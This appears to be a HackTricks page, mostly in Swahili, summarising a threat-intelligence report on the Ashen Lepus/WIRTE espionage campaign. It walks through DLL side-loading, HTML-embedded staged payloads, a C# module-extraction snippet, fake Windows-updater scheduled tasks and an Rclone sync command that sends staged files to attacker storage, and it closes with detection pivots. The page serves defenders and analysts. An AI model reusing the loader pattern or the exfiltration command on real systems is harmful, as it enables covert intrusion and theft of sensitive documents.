# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Muhtasari wa Mbinu

Ashen Lepus (aka WIRTE) alitumia muundo unaorudiwa unaochaina DLL sideloading, staged HTML payloads, na modular .NET backdoors ili kudumu ndani ya mitandao ya ubalozi ya Mashariki ya Kati. Mbinu hii inaweza kutumika tena na opereta yeyote kwa sababu inategemea:

- **Archive-based social engineering**: PDF zisizo hatari zinaelekeza walengwa kuvuta archive ya RAR kutoka tovuti ya kushiriki faili. Archive inajumuisha EXE ya msomaji wa nyaraka inayoonekana halali, DLL mbaya iliyojina kama maktaba ya kuaminika (e.g., `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), na `Document.pdf` ya kujiingiza.
- **DLL search order abuse**: mteja anabonyeza mara mbili EXE, Windows inatafuta import ya DLL kutoka saraka ya sasa, na loader mbaya (AshenLoader) inatekelezwa ndani ya mchakato uliothibitishwa huku PDF ya kujiingiza ikifunguka ili kuepuka mashaka.
- **Living-off-the-land staging**: kila hatua inayofuata (AshenStager → AshenOrchestrator → modules) haiko kwenye diski hadi itakapohitajika, hutumwa kama blobs zilizofichwa zilizosasishwa na encryption ndani ya majibu ya HTML yasiyo hatari.

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: EXE inafanya side-load AshenLoader, ambayo hufanya recon ya mwenyeji, inaiweka kwa AES-CTR, na inai-POST ndani ya parameter zinazorota kama `token=`, `id=`, `q=`, au `auth=` kwenye njia zinazoonekana kama API (mfano `/api/v2/account`).
2. **HTML extraction**: C2 hutangaza tu hatua inayofuata wakati IP ya mteja inapotofautishwa hadi mkoa lengwa na `User-Agent` inavyolingana na implant, ikikusudia kuwakataliwa sandboxes. Wakati ukaguzi unapopita, mwili wa HTTP una `<headerp>...</headerp>` blob yenye payload ya AshenStager iliyosimbwa kwa Base64/AES-CTR.
3. **Second sideload**: AshenStager inaendeshwa pamoja na binary halali nyingine inayoinport `wtsapi32.dll`. Nakala mbaya iliyochanganywa ndani ya binary inachukua HTML zaidi, wakati huu ikikamua `<article>...</article>` ili kupata AshenOrchestrator.
4. **AshenOrchestrator**: controller modular wa .NET anayefasiri config ya JSON iliyofungwa kwa Base64. Vectors za config `tg` na `au` zinachanganishwa/kuwekwa hash kuwa key ya AES, ambayo inaunda ufunguo wa kusambaza `xrk`. Bytes zinazotokana hutumika kama key ya XOR kwa kila blob ya module inayopatikana baadaye.
5. **Module delivery**: kila module inaelezewa kupitia maoni ya HTML ambayo yanamwandisha parser kwa tag yoyote ile, kuvunja sheria za static zinazotafuta tu `<headerp>` au `<article>`. Modules ni pamoja na persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`), na file exploration (`FE`).

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Hata kama watetezi watazuia au kuondoa kipengele fulani, msimamizi anahitaji tu kubadilisha tag iliyotajwa katika maoni ya HTML ili kuendeleza utoaji.

## Crypto & C2 Hardening

- **AES-CTR everywhere**: loaders za sasa zinaweka funguo za 256-bit pamoja na nonces (mfano `{9a 20 51 98 ...}`) na kwa hiari zinaongeza tabaka la XOR kwa kutumia strings kama `msasn1.dll` kabla/baada ya decryption.
- **Recon smuggling**: data iliyoorodheshwa sasa inajumuisha listings za Program Files kutambua apps zenye thamani kubwa na daima imeencrypted kabla ya kuondoka kwenye host.
- **URI churn**: query parameters na REST paths zinazunguka kati ya campaigns (`/api/v1/account?token=` → `/api/v2/account?auth=`), zikiharibu detections dhaifu.
- **Gated delivery**: servers zimegeo-fenced na zinajibu implants halisi pekee. Clients wasioruhusiwa hupokea HTML isiyo ya kushtukiza.

## Persistence & Execution Loop

AshenStager hunyunyizia scheduled tasks zinazojifanya kazi za matengenezo ya Windows na zinafanywa kupitia `svchost.exe`, kwa mfano:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Kazi hizi zinarudisha kuanzishwa kwa mnyororo wa sideloading wakati wa boot au kwa vipindi, kuhakikisha AshenOrchestrator inaweza kuomba modules mpya bila kugusa disk tena.

## Using Benign Sync Clients for Exfiltration

Wadhibiti huweka nyaraka za kidiplomasia ndani ya `C:\Users\Public` (zinazosomwa na wengi na zisizo za kushtuka) kupitia module maalumu, kisha hupakua binary halali ya [Rclone](https://rclone.org/) ili kusawazisha saraka hiyo na hifadhi inayodhibitiwa na mwadui:

1. **Stage**: nakili/ikusanye faili za lengo ndani ya `C:\Users\Public\{campaign}\`.
2. **Configure**: tuma usanidi wa Rclone unaoonyesha kwenye endpoint ya HTTPS inayodhibitiwa na mwadui (mfano `api.technology-system[.]com`).
3. **Sync**: endesha `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` ili trafiki ionekane kama backups za kawaida za cloud.

Kwa kuwa Rclone inatumika sana kwa workflows za halali za backup, watetezi wanapaswa kuzingatia utekelezaji usio wa kawaida (binaries mpya, remotes zisizo za kawaida, au kusawazisha ghafla `C:\Users\Public`).

## Detection Pivots

- Alert kuhusu **signed processes** ambazo ghafla zinapakia DLLs kutoka njia zinazoweza kuandikwa na watumiaji (Procmon filters + `Get-ProcessMitigation -Module`), hasa wakati majina ya DLL yanashirikiana na `netutils`, `srvcli`, `dwampi`, au `wtsapi32`.
- Chunguza majibu ya HTTPS yenye shaka kwa **large Base64 blobs embedded inside unusual tags** au zilizo na ulinzi wa maoni `<!-- TAG: <xyz> -->`.
- Tafuta **scheduled tasks** zinazomfanya `svchost.exe` kuendeshwa na arguments zisizo za service au zinazorejea kwenye directories za dropper.
- Fuata **Rclone** binaries zinazoibuka nje ya maeneo yanayosimamiwa na IT, faili mpya za `rclone.conf`, au sync jobs zinazoleta kutoka saraka za staging kama `C:\Users\Public`.

## References

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)

{{#include ../../../banners/hacktricks-training.md}}
